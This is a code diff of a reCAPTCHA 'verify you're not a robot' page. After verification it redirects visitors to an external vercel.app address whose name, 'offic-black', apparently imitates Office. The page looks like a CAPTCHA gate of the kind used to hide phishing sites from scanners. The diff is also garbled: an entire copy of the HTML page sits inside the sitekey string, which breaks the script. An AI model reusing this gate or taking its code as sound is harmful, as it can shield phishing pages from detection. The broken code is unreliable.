@@ -1,130 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Human Verification | Secure Access</title>
-
-  <!-- reCAPTCHA -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>reCAPTCHA Verification (Working Example)</title>
   <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>
-
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
-      font-family: "Inter", Arial, sans-serif;
+      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
-      background: linear-gradient(135deg, #4b2e05, #3b2404);
-      color: #333;
+      background: #f4f4f4;
     }
-
     .container {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.2);
-      padding: 2rem 2.5rem;
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       text-align: center;
-      width: 100%;
-      max-width: 380px;
-      animation: fadeIn 1s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    h1 {
-      font-size: 1.5rem;
-      margin-bottom: 1.2rem;
-      color: #3b2404;
-    }
-
-    p {
-      margin-top: 0.8rem;
-      font-size: 0.95rem;
-      color: #5a4633;
-    }
-
-    #status {
-      margin-top: 1rem;
-      font-size: 0.9rem;
-    }
-
-    #loading {
-      display: none;
-      color: #4b2e05;
-      margin-top: 0.5rem;
-      font-weight: 600;
-      animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-      0% { opacity: 0.3; }
-      50% { opacity: 1; }
-      100% { opacity: 0.3; }
     }
   </style>
 </head>
 <body>
-  <div class="container" id="verifyBox">
+  <div class="container">
     <h1>Please verify you’re not a robot</h1>
     <div id="recaptcha-container"></div>
-    <p id="status">Complete the CAPTCHA to continue</p>
-    <div id="loading">Redirecting...</div>
+    <p id="status">Waiting for verification...</p>
   </div>
 
   <script>
     function onloadCallback() {
       grecaptcha.render('recaptcha-container', {
-        sitekey: 'YOUR_REAL_SITE_KEY_HERE', // replace with your registered domain key
-        callback: onSuccess,
-        'expired-callback': onExpired,
-        'error-callback': onError
+        sitekey: '<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>reCAPTCHA Verification (Working Example)</title>
+  <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f4f4f4;
+    }
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Please verify you’re not a robot</h1>
+    <div id="recaptcha-container"></div>
+    <p id="status">Waiting for verification...</p>
+  </div>
+
+  <script>
+    function onloadCallback() {
+      grecaptcha.render('recaptcha-container', {
+        sitekey: '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI', // test key
+        callback: function(token) {
+          document.getElementById('status').textContent = '✅ Verified successfully!';
+          document.getElementById('status').style.color = 'green';
+          setTimeout(() => window.location.href = 'https://offic-black.vercel.app', 1000);
+        }
       });
     }
-
-    function onSuccess(token) {
-      const status = document.getElementById('status');
-      const loading = document.getElementById('loading');
-      status.textContent = 'Verification successful!';
-      status.style.color = '#2e7d32';
-      loading.style.display = 'block';
-
-      console.log('reCAPTCHA token:', token);
-      setTimeout(() => {
-        window.location.href = 'https://offic-black.vercel.app';
-      }, 1200);
+  </script>
+</body>
+</html>
+I', // test key
+        callback: function(token) {
+          document.getElementById('status').textContent = '✅ Verified successfully!';
+          document.getElementById('status').style.color = 'green';
+          setTimeout(() => window.location.href = 'https://example.com', 1000);
+        }
+      });
     }
-
-    function onExpired() {
-      const status = document.getElementById('status');
-      status.textContent = 'Verification expired. Redirecting home...';
-      status.style.color = '#b71c1c';
-      setTimeout(() => window.location.href = '/home', 1500);
-      grecaptcha.reset();
-    }
-
-    function onError() {
-      const status = document.getElementById('status');
-      status.textContent = 'Verification failed. Redirecting home...';
-      status.style.color = '#b71c1c';
-      setTimeout(() => window.location.href = '/home', 1500);
-      grecaptcha.reset();
-    }
-
-    setTimeout(() => {
-      if (typeof grecaptcha === 'undefined') {
-        document.getElementById('status').textContent = 'Error loading CAPTCHA. Redirecting...';
-        setTimeout(() => window.location.href = '/home', 1500);
-      }
-    }, 5000);
   </script>
 </body>
 </html>
